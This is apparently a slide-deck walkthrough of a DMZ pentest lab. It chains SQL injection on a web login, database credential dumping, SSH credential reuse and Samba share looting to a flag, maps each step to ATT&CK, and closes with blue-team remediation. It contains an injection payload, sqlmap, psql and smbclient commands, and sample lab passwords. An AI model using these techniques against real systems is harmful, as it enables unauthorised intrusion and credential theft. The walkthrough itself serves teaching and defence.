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WALKTHROUGH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Walkthrough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web SQL injection to the internal Samba share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DMZ Pentest Lab — Lateral Movement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ubuntu-web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SQLi → DB creds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fedora-ssh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reuse creds (SSH)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opensuse-smb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share → loot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7764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 credential thread across the DMZ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Recon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 172.30.0.0/24                     # discover hosts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-p 21,22,80,139,445,5432 172.30.0.0/24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hosts and services before touching anything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to ATT&amp;CK: Discovery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Initial access (SQLi)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login form is vulnerable to SQL injection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 admin' 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 anything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automate:  sqlmap -u http://172.30.0.10/login.php --data ...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 app concatenates input straight into the query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to ATT&amp;CK: Initial Access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Credential access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creds sit in the web config and the database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-h 172.30.0.10 -U webapp -d webapp -c 'SELECT * FROM users;'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svc_backup : B@ckup#2024!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 the users table; note the svc_backup service account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to ATT&amp;CK: Credential Access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Lateral movement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DB password is reused for the Linux user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svc_backup@172.30.0.20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password: B@ckup#2024!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reuse is the pivot into fedora-ssh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to ATT&amp;CK: Lateral Movement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Collection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~/.smbcredentials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username=smbbackup  password=Sh@re#Backup22!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share=//172.30.0.30/backup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hop's credentials were left on disk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to ATT&amp;CK: Collection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—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smbclient //172.30.0.30/backup -U smbbackup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smb: \&gt; get flag.txt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flag.txt   # FLAG{lateral_movement_complete}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the loot from the Samba share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complete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6692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669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domain of the DMZ reached by chaining three small misconfigurations.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remediation (blue team)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parameterized queries — kills the SQL injection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store credentials in web-readable files or reuse them across hosts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 secrets on disk in home directories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the DMZ and monitor SSH/SMB auth for reuse patterns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2026-08-01T16:28:52Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-08-01T16:28:52Z</dcterms:modified>
</cp:coreProperties>
</file>